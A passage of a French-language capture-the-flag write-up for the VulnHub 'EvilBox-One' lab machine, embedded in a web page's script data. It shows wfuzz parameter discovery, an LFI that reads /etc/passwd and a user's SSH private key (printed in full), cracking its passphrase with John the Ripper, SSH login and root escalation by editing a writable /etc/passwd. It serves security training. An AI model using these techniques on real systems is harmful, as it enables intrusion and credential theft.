ce dossier. Ce dernier ne retourne rien. Cherchons si un param√®tre existe sur cette URL avec l'outil \u003Cstrong\u003Ewfuzz\u003C\u002Fstrong\u003E.\u003C\u002Fp\u003E\n\u003Cdiv class=\"gridsome-highlight\" data-language=\"bash\"\u003E\u003Cpre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"\u003E\u003Ccode class=\"language-bash\"\u003E$ wfuzz -w \u002Fusr\u002Fshare\u002Fwordlists\u002Fdirb\u002Fcommon.txt --hh \u003Cspan class=\"token number\"\u003E0\u003C\u002Fspan\u003E \u003Cspan class=\"token string\"\u003E'http:\u002F\u002F192.168.1.26\u002Fsecret\u002Fevil.php?FUZZ=\u002Fetc\u002Fpasswd'\u003C\u002Fspan\u003E\n000000947:   \u003Cspan class=\"token number\"\u003E200\u003C\u002Fspan\u003E        \u003Cspan class=\"token number\"\u003E26\u003C\u002Fspan\u003E L     \u003Cspan class=\"token number\"\u003E38\u003C\u002Fspan\u003E W       \u003Cspan class=\"token number\"\u003E1431\u003C\u002Fspan\u003E Ch     \u003Cspan class=\"token string\"\u003E\"command\"\u003C\u002Fspan\u003E      \u003C\u002Fcode\u003E\u003Cspan aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fpre\u003E\u003C\u002Fdiv\u003E\n\u003Cp\u003EIl existe un param√®tre, \"command\". Sur \u003Ca href=\"http:\u002F\u002F192.168.1.26\u002Fsecret\u002Fevil.php?command=\u002Fetc\u002Fpasswd\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003Ehttp:\u002F\u002F192.168.1.26\u002Fsecret\u002Fevil.php?command=\u002Fetc\u002Fpasswd\u003C\u002Fa\u003E, on a bien les infos d'utilisateurs dont celui d'un certain \"mowree\".\u003C\u002Fp\u003E\n\u003Cdiv class=\"gridsome-highlight\" data-language=\"txt\"\u003E\u003Cpre style=\"counter-reset: linenumber NaN\" class=\"language-txt line-numbers\"\u003E\u003Ccode class=\"language-txt\"\u003Eroot:x:0:0:root:\u002Froot:\u002Fbin\u002Fbash\nmowree:x:1000:1000:mowree,,,:\u002Fhome\u002Fmowree:\u002Fbin\u002Fbash\u003C\u002Fcode\u003E\u003Cspan aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fpre\u003E\u003C\u002Fdiv\u003E\n\u003Cp\u003EOn est sur une faille de type LFI (Local File Inclusion).\u003C\u002Fp\u003E\n\u003Cp\u003EEt sur l'URL \u003Ca href=\"http:\u002F\u002F192.168.1.26\u002Fsecret\u002Fevil.php?command=\u002Fhome\u002Fmowree\u002F.ssh\u002Fid_rsa\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003Ehttp:\u002F\u002F192.168.1.26\u002Fsecret\u002Fevil.php?command=\u002Fhome\u002Fmowree\u002F.ssh\u002Fid_rsa\u003C\u002Fa\u003E, on tombe bien sur la clef SSH de l'utilisateur.\u003C\u002Fp\u003E\n\u003Cdiv class=\"gridsome-highlight\" data-language=\"txt\"\u003E\u003Cpre style=\"counter-reset: linenumber NaN\" class=\"language-txt line-numbers\"\u003E\u003Ccode class=\"language-txt\"\u003E-----BEGIN RSA PRIVATE KEY-----\nProc-Type: 4,ENCRYPTED\nDEK-Info: DES-EDE3-CBC,9FB14B3F3D04E90E\n\nuuQm2CFIe\u002FeZT5pNyQ6+K1Uap\u002FFYWcsEklzONt+x4AO6FmjFmR8RUpwMHurmbRC6\nhqyoiv8vgpQgQRPYMzJ3QgS9kUCGdgC5+cXlNCST\u002FGKQOS4QMQMUTacjZZ8EJzoe\no7+7tCB8Zk\u002FsW7b8c3m4Cz0CmE5mut8ZyuTnB0SAlGAQfZjqsldugHjZ1t17mldb\n+gzWGBUmKTOLO\u002FgcuAZC+Tj+BoGkb2gneiMA85oJX6y\u002Fdqq4Ir10Qom+0tOFsuot\nb7A9XTubgElslUEm8fGW64kX3x3LtXRsoR12n+krZ6T+IOTzThMWExR1Wxp4Ub\u002Fk\nHtXTzdvDQBbgBf4h08qyCOxGEaVZHKaV\u002FynGnOv0zhlZ+z163SjppVPK07H4bdLg\n9SC1omYunvJgunMS0ATC8uAWzoQ5Iz5ka0h+NOofUrVtfJZ\u002FOnhtMKW+M948EgnY\nzh7Ffq1KlMjZHxnIS3bdcl4MFV0F3Hpx+iDukvyfeeWKuoeUuvzNfVKVPZKqyaJu\nrRqnxYW\u002FfzdJm+8XViMQccgQAaZ+Zb2rVW0gyifsEigxShdaT5PGdJFKKVLS+bD1\ntHBy6UOhKCn3H8edtXwvZN+9PDGDzUcEpr9xYCLkmH+hcr06ypUtlu9UrePLh\u002FXs\n94KATK4joOIW7O8GnPdKBiI+3Hk0qakL1kyYQVBtMjKTyEM8yRcssGZr\u002FMdVnYWm\nVD5pEdAybKBfBG\u002FxVu2CR378BRKzlJkiyqRjXQLoFMVDz3I30RpjbpfYQs2Dm2M7\nMb26wNQW4ff7qe30K\u002FIxrm7MfkJPzueQlSi94IHXaPvl4vyCoPLW89JzsNDsvG8P\nhrkWRpPIwpzKdtMPwQbkPu4ykqgKkYYRmVlfX8oeis3C1hCjqvp3Lth0QDI+7Shr\nFb5w0n0qfDT4o03U1Pun2iqdI4M+iDZUF4S0BD3xA\u002Fzp+d98NnGlRqMmJK+StmqR\nIIk3DRRkvMxxCm12g2DotRUgT2+mgaZ3nq55eqzXRh0U1P5QfhO+V8WzbVzhP6+R\nMtqgW1L0iAgB4CnTIud6DpXQtR9l\u002F\u002F9alrXa+4nWcDW2GoKjljxOKNK8jXs58SnS\n62LrvcNZVokZjql8Xi7xL0XbEk0gtpItLtX7xAHLFTVZt4UH6csOcwq5vvJAGh69\nQ\u002Fikz5XmyQ+wDwQEQDzNeOj9zBh1+1zrdmt0m7hI5WnIJakEM2vqCqluN5CEs4u8\np1ia+meL0JVlLobfnUgxi3Qzm9SF2pifQdePVU4GXGhIOBUf34bts0iEIDf+qx2C\npwxoAe1tMmInlZfR2sKVlIeHIBfHq\u002FhPf2PHvU0cpz7MzfY36x9ufZc5MH2JDT8X\nKREAJ3S0pMplP\u002FZcXjRLOlESQXeUQ2yvb61m+zphg0QjWH131gnaBIhVIj1nLnTa\ni99+vYdwe8+8nJq4\u002FWXhkN+VTYXndET2H0fFNTFAqbk2HGy6+6qS\u002F4Q6DVVxTHdp\n4Dg2QRnRTjp74dQ1NZ7juucvW7DBFE+CK80dkrr9yFyybVUqBwHrmmQVFGLkS2I\u002F\n8kOVjIjFKkGQ4rNRWKVoo\u002FHaRoI\u002Ff2G6tbEiOVclUMT8iutAg8S4VA==\n-----END RSA PRIVATE KEY-----\u003C\u002Fcode\u003E\u003Cspan aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fpre\u003E\u003C\u002Fdiv\u003E\n\u003Cp\u003EOn r√©cup√®re ce fichier via \u003Cstrong\u003Ewget\u003C\u002Fstrong\u003E.\u003C\u002Fp\u003E\n\u003Cp\u003E\u003Ccode class=\"language-text\"\u003Ewget http:\u002F\u002F$IP\u002Fsecret\u002Fevil.php?command=\u002Fhome\u002Fmowree\u002F.ssh\u002Fid_rsa -O id_rsa\u003C\u002Fcode\u003E\u003C\u002Fp\u003E\n\u003Cp\u003EEt on n'oublie pas le \u003Cstrong\u003Echmod\u003C\u002Fstrong\u003E pour plus tard.\u003C\u002Fp\u003E\n\u003Cp\u003E\u003Ccode class=\"language-text\"\u003Echmod 600 id_rsa\u003C\u002Fcode\u003E\u003C\u002Fp\u003E\n\u003Cp\u003ED√©sormais, il nous faut retrouver la clef du mot de passe associ√©.\u003C\u002Fp\u003E\n\u003Cp\u003ET√©l√©chargez l'utilitaire \"ssh2john.py\" avec la commande \u003Ccode class=\"language-text\"\u003Ewget https:\u002F\u002Fraw.githubusercontent.com\u002Fmagnumripper\u002FJohnTheRipper\u002Fbleeding-jumbo\u002Frun\u002Fssh2john.py\u003C\u002Fcode\u003E et g√©n√©rez un nouveau fichier \u003Ccode class=\"language-text\"\u003Epython ssh2john.py id_rsa &gt; id_rsa.hash\u003C\u002Fcode\u003E.\u003C\u002Fp\u003E\n\u003Cp\u003EAfin d'utiliser \u003Cstrong\u003EJohn The Ripper\u003C\u002Fstrong\u003E.\u003C\u002Fp\u003E\n\u003Cdiv class=\"gridsome-highlight\" data-language=\"bash\"\u003E\u003Cpre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"\u003E\u003Ccode class=\"language-bash\"\u003E$ john --wordlist\u003Cspan class=\"token operator\"\u003E=\u003C\u002Fspan\u003E\u002Fusr\u002Fshare\u002Fwordlists\u002Frockyou.txt id_rsa.hash\nUsing default input encoding: UTF-8\nLoaded \u003Cspan class=\"token number\"\u003E1\u003C\u002Fspan\u003E password \u003Cspan class=\"token builtin class-name\"\u003Ehash\u003C\u002Fspan\u003E \u003Cspan class=\"token punctuation\"\u003E(\u003C\u002Fspan\u003ESSH \u003Cspan class=\"token punctuation\"\u003E[\u003C\u002Fspan\u003ERSA\u002FDSA\u002FEC\u002FOPENSSH \u003Cspan class=\"token punctuation\"\u003E(\u003C\u002Fspan\u003ESSH private keys\u003Cspan class=\"token punctuation\"\u003E)\u003C\u002Fspan\u003E \u003Cspan class=\"token number\"\u003E32\u003C\u002Fspan\u003E\u002F64\u003Cspan class=\"token punctuation\"\u003E]\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E)\u003C\u002Fspan\u003E\nCost \u003Cspan class=\"token number\"\u003E1\u003C\u002Fspan\u003E \u003Cspan class=\"token punctuation\"\u003E(\u003C\u002Fspan\u003EKDF\u002Fcipher \u003Cspan class=\"token punctuation\"\u003E[\u003C\u002Fspan\u003E\u003Cspan class=\"token number\"\u003E0\u003C\u002Fspan\u003E\u003Cspan class=\"token operator\"\u003E=\u003C\u002Fspan\u003EMD5\u002FAES \u003Cspan class=\"token assign-left variable\"\u003E1\u003C\u002Fspan\u003E\u003Cspan class=\"token operator\"\u003E=\u003C\u002Fspan\u003EMD5\u002F3DES \u003Cspan class=\"token assign-left variable\"\u003E2\u003C\u002Fspan\u003E\u003Cspan class=\"token operator\"\u003E=\u003C\u002Fspan\u003EBcrypt\u002FAES\u003Cspan class=\"token punctuation\"\u003E]\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E)\u003C\u002Fspan\u003E is \u003Cspan class=\"token number\"\u003E1\u003C\u002Fspan\u003E \u003Cspan class=\"token keyword\"\u003Efor\u003C\u002Fspan\u003E all loaded hashes\nCost \u003Cspan class=\"token number\"\u003E2\u003C\u002Fspan\u003E \u003Cspan class=\"token punctuation\"\u003E(\u003C\u002Fspan\u003Eiteration count\u003Cspan class=\"token punctuation\"\u003E)\u003C\u002Fspan\u003E is \u003Cspan class=\"token number\"\u003E2\u003C\u002Fspan\u003E \u003Cspan class=\"token keyword\"\u003Efor\u003C\u002Fspan\u003E all loaded hashes\nWill run \u003Cspan class=\"token number\"\u003E2\u003C\u002Fspan\u003E OpenMP threads\n\nNote: This \u003Cspan class=\"token function\"\u003Eformat\u003C\u002Fspan\u003E may emit \u003Cspan class=\"token boolean\"\u003Efalse\u003C\u002Fspan\u003E positives, so it will keep trying even after\nfinding a possible candidate.\nPress \u003Cspan class=\"token string\"\u003E'q'\u003C\u002Fspan\u003E or Ctrl-C to abort, almost any other key \u003Cspan class=\"token keyword\"\u003Efor\u003C\u002Fspan\u003E status\nunicorn          \u003Cspan class=\"token punctuation\"\u003E(\u003C\u002Fspan\u003Eid_rsa\u003Cspan class=\"token punctuation\"\u003E)\u003C\u002Fspan\u003E\u003C\u002Fcode\u003E\u003Cspan aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fpre\u003E\u003C\u002Fdiv\u003E\n\u003Cp\u003E\u003Cstrong\u003EJohn\u003C\u002Fstrong\u003E a trouv√© le mot de passe, \"unicorn\".\u003C\u002Fp\u003E\n\u003Ch2\u003EP√©n√©tration\u003C\u002Fh2\u003E\n\u003Cp\u003EEn poss√©ssion de la clef SSH et du mot de passe associ√©, on peut donc se connecter au serveur \u003Cstrong\u003ESSH\u003C\u002Fstrong\u003E sans encombres.\u003C\u002Fp\u003E\n\u003Cdiv class=\"gridsome-highlight\" data-language=\"bash\"\u003E\u003Cpre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"\u003E\u003Ccode class=\"language-bash\"\u003E$ \u003Cspan class=\"token function\"\u003Essh\u003C\u002Fspan\u003E mowree@\u003Cspan class=\"token variable\"\u003E$IP\u003C\u002Fspan\u003E -i id_rsa\nThe authenticity of \u003Cspan class=\"token function\"\u003Ehost\u003C\u002Fspan\u003E \u003Cspan class=\"token string\"\u003E'192.168.1.26 (192.168.1.26)'\u003C\u002Fspan\u003E can\u003Cspan class=\"token string\"\u003E't be established.\nECDSA key fingerprint is SHA256:cd9WCNmPY0i3zsZaPEV0qa7yp5hz8+TVNalFULd5CwM.\nAre you sure you want to continue connecting (yes\u002Fno\u002F[fingerprint])? yes\nWarning: Permanently added '\u003C\u002Fspan\u003E\u003Cspan class=\"token number\"\u003E192.168\u003C\u002Fspan\u003E.1.26\u003Cspan class=\"token string\"\u003E' (ECDSA) to the list of known hosts.\nEnter passphrase for key '\u003C\u002Fspan\u003Eid_rsa': \nLinux EvilBoxOne \u003Cspan class=\"token number\"\u003E4.19\u003C\u002Fspan\u003E.0-17-amd64 \u003Cspan class=\"token comment\"\u003E#1 SMP Debian 4.19.194-3 (2021-07-18) x86_64\u003C\u002Fspan\u003E\u003C\u002Fcode\u003E\u003Cspan aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fpre\u003E\u003C\u002Fdiv\u003E\n\u003Cp\u003EOn trouve le premier flag dans le fichier \"user.txt\".\u003C\u002Fp\u003E\n\u003Cdiv class=\"gridsome-highlight\" data-language=\"bash\"\u003E\u003Cpre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"\u003E\u003Ccode class=\"language-bash\"\u003E$ \u003Cspan class=\"token function\"\u003Ecat\u003C\u002Fspan\u003E user.txt\n56Rbp0soobpzWSVzKh9YOvzGLgtPZQ\u003C\u002Fcode\u003E\u003Cspan aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fpre\u003E\u003C\u002Fdiv\u003E\n\u003Ch2\u003EEscalation\u003C\u002Fh2\u003E\n\u003Cp\u003EOn voit que le fichier \"passwd\" est modifiable.\u003C\u002Fp\u003E\n\u003Cdiv class=\"gridsome-highlight\" data-language=\"bash\"\u003E\u003Cpre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"\u003E\u003Ccode class=\"language-bash\"\u003E$ \u003Cspan class=\"token function\"\u003Els\u003C\u002Fspan\u003E -la \u002Fetc\u002Fpasswd\n-rw-rw-rw- \u003Cspan class=\"token number\"\u003E1\u003C\u002Fspan\u003E root root \u003Cspan class=\"token number\"\u003E1431\u003C\u002Fspan\u003E ago \u003Cspan class=\"token number\"\u003E29\u003C\u002Fspan\u003E \u003Cspan class=\"token number\"\u003E12\u003C\u002Fspan\u003E:50 \u002Fetc\u002Fpasswd\u003C\u002Fcode\u003E\u003Cspan aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fpre\u003E\u003C\u002Fdiv\u003E\n\u003Cp\u003EOn g√©n√®re donc un nouveau mot de passe \"unicorn\" via \u003Cstrong\u003Eopenssl\u003C\u002Fstrong\u003E.\u003C\u002Fp\u003E\n\u003Cdiv class=\"gridsome-highlight\" data-language=\"bash\"\u003E\u003Cpre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"\u003E\u003Ccode class=\"language-bash\"\u003E$ openssl \u003Cspan class=\"token function\"\u003Epasswd\u003C\u002Fspan\u003E -1 unicorn\n\u003Cspan class=\"token variable\"\u003E$1\u003C\u002Fspan\u003E\u003Cspan class=\"token variable\"\u003E$U413\u003C\u002Fspan\u003E.MQ6$.ZO\u002F2.l5DWY.2OotSCog61\u003C\u002Fcode\u003E\u003Cspan aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fpre\u003E\u003C\u002Fdiv\u003E\n\u003Cp\u003EOn copie ce mot de passe dans le fichier \"passwd\" dans la ligne ci-dessous.\u003C\u002Fp\u003E\n\u003Cdiv class=\"gridsome-highlight\" data-language=\"bash\"\u003E\u003Cpre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"\u003E\u003Ccode class=\"language-bash\"\u003E$ \u003Cspan class=\"token function\"\u003Enano\u003C\u002Fspan\u003E \u002Fetc\u002Fpasswd\nroot:\u003Cspan class=\"token variable\"\u003E$1\u003C\u002Fspan\u003E\u003Cspan class=\"token variable\"\u003E$U413\u003C\u002Fspan\u003E.MQ6$.ZO\u002F2.l5DWY.2OotSCog61:0:0:root:\u002Froot:\u002Fbin\u002Fbash\u003C\u002Fcode\u003E\u003Cspan aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fpre\u003E\u003C\u002Fdiv\u003E\n\u003Cp\u003EUne fois le fichier enregistr√©, on peut se connecter en \"root\".\u003C\u002Fp\u003E\n\u003Cdiv class=\"gridsome-highlight\" data-language=\"bash\"\u003E\u003Cpre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"\u003E\u003Ccode class=\"language-bash\"\u003E$ \u003Cspan class=\"token function\"\u003Esu\u003C\u002Fspan\u003E -l root\nContrase√±a: unicorn\n$ \u003Cspan class=\"token function\"\u003Eid\u003C\u002Fspan\u003E\n\u003Cspan class=\"token assign-left variable\"\u003Euid\u003C\u002Fspan\u003E\u003Cspan class=\"token operator\"\u003E=\u003C\u002Fspan\u003E\u003Cspan class=\"token number\"\u003E0\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E(\u003C\u002Fspan\u003Eroot\u003Cspan class=\"token punctuation\"\u003E)\u003C\u002Fspan\u003E \u003Cspan class=\"token assign-left variable\"\u003Egid\u003C\u002Fspan\u003E\u003Cspan class=\"token operator\"\u003E=\u003C\u002Fspan\u003E\u003Cspan class=\"token number\"\u003E0\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E(\u003C\u002Fspan\u003Eroot\u003Cspan class=\"token punctuation\"\u003E)\u003C\u002Fspan\u003E \u003Cspan class=\"token assign-left variable\"\u003Egrupos\u003C\u002Fspan\u003E\u003Cspan class=\"token operator\"\u003E=\u003C\u002Fspan\u003E\u003Cspan class=\"token number\"\u003E0\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E(\u003C\u002Fspan\u003Eroot\u003Cspan class=\"token punctuation\"\u003E)\u003C\u002Fspan\u003E\u003C\u002Fcode\u003E\u003Cspan aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fpre\u003E\u003C\u002Fdiv\u003E\n\u003Cp\u003EEt trouver le flag de ce dernier.\u003C\u002Fp\u003E\n\u003Cdiv class=\"gridsome-highlight\" data-language=\"bash\"\u003E\u003Cpre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"\u003E\u003Ccode class=\"language-bash\"\u003E$ \u003Cspan class=\"token function\"\u003Ecat\u003C\u002Fspan\u003E \u002Froot\u002Froot.txt\n36QtXfdJWvdC0VavlPIApUbDlqTsBM\u003C\u002Fcode\u003E\u003Cspan aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fpre\u003E\u003C\u002Fdiv\u003E\n","download":"https:\u002F\u002Fwww.vulnhub.com\u002Fentry\u002Fevilbox-one,736","tags":[{"title":"Pentest","path":"\u002Ftag\u002FPentest\u002F"},{"title":"CTF","path":"\u002Ftag\u002FCTF\u002F"}],"timeToRead":8,"parts":[]}},"context":{}};(function(){var s;(s=document.currentScript||document.scripts[document.scripts.length-1]).parentNode.removeChild(s);}());</script><script src="/assets/js/app.50d8a5ce.js" defer></script><script src="/assets/js/page--src-templates-post-vue.56e5bc07.js" defer></script>
  </body>
</html>
